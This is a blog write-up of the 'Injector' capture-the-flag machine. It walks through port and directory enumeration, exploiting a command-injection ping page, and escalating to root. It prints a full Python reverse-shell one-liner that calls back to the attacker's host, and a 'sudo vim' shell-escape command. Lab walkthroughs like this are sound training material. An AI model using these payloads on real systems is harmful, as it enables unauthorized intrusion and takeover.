---
title: "CyberTalents Injector Machine Writeup"
date: "2020-12-13"
layout: single
---
![logo](https://k.top4top.io/p_18081y31k1.png)

Injector machine is an easy box with some good ideas.

By the way, I couldn't solve the machine through the vpn because of some problems, but I solved the machine through it's public IP which is 3.127.234.70

# Methodology
* Enumeration
* Exploiting Command Injection Vulnerability
* Privilege Escalation

>so first i'll do Nmap scan to find out which services running in this machine

# []()Nmap Scan :
```ruby
# Nmap 7.91 scan initiated Sun Dec 13 16:14:30 2020 as: nmap -sV -sC -oN nmap 3.127.234.70
Nmap scan report for ec2-3-127-234-70.eu-central-1.compute.amazonaws.com (3.127.234.70)
Host is up (0.089s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:34:1a:fd:db:03:c5:81:05:b0:64:cf:70:ad:63:3e (RSA)
|   256 04:f2:79:9a:04:fd:0e:78:ac:df:12:50:55:4d:a2:c6 (ECDSA)
|_  256 a8:67:8f:0c:e9:b1:3d:53:b4:9d:fe:fd:93:af:e6:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Well now we have 2 open ports which is :

* 22/tcp > ssh > OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;protocol 2.0)
* 80/tcp > http > Apache httpd 2.4.29 ((Ubuntu))

> Now i'll check the webserver

![webserver](https://f.top4top.io/p_1808i2h201.png)

it's Apache2 ubuntu default page, nothing is interesting here so let's do directory listing using gobuster.

```python
┌─[kali@kali]─[~]
└──╼ $gobuster dir -u http://3.127.234.70/ -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://3.127.234.70/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/13 16:50:56 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
```
> we got /secret directory so let's open it!

![dir](https://c.top4top.io/p_1808t0ppg1.png)

nothing is interesting again so maybe let's do directory listing again!

```python
┌─[kali@kali]─[~]
└──╼ $gobuster dir -u http://3.127.234.70/secret/ -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://3.127.234.70/secret/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/13 17:43:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/company (Status: 301)
/admin.html (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/root (Status: 301)
/test (Status: 301)
/tools (Status: 301)
===============================================================
```
now we got /company, /admin.html, /root, /test and /tools!

> btw i checked company, admin.html, root, test directories and there's nothing intersting there.

then i opened tools directory and i found this

![dir](https://j.top4top.io/p_1808si31p1.png)

also i opened ping.php and i found this page!

![pingo](https://c.top4top.io/p_18087gump1.png)

> It's a pinging script vulnerable to Command Injection vulnerability

while it's a command injection vulnerability i manged to get a reverse shell and spwaning a tty shell using this one line python3 code

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.x.x.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

and bingo! we to poped a shell and now we're in www-data.

![shell](https://k.top4top.io/p_1808cr6621.png)


# Privilege Escalation :

> while playing and searching i found an image called TrollFace.jpg in /var/www directory and i downloaded it to my machine using the netcat method 

![trollface](https://j.top4top.io/p_1808qvhkr1.png)

> i used strings and stegosuite and got nothing useful so i tried to extract it using steghide and i managed to get a password without passphrase!

![stegohelpsalot](https://d.top4top.io/p_1808cr6vd1.png)

and i came back to the machine to read /etc/passwd and i found a user called alex and i switched to this user using the password that we got from TrollFace image

![alex](https://c.top4top.io/p_1808ucm1c1.png)

>now i used ![linux-exploit-suggester](https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl) to search for possible exploits but no exploits are available for this machine kernel version..

so i typed sudo -l to see if there's anything running with root permissions and i found vim working with root permissions so i used this command to pop a r00t shell
```bash
sudo vim -c ' : ! /bin/sh ' /usr/bin/vim
```
![vimonfire](https://l.top4top.io/p_1808zkh611.png)

and we got root flag.

![r00t!](https://j.top4top.io/p_1808volbp1.png)

for any questions dm me on ![Facebook](https://facebook.com/Jizen0x01)

* cheers!
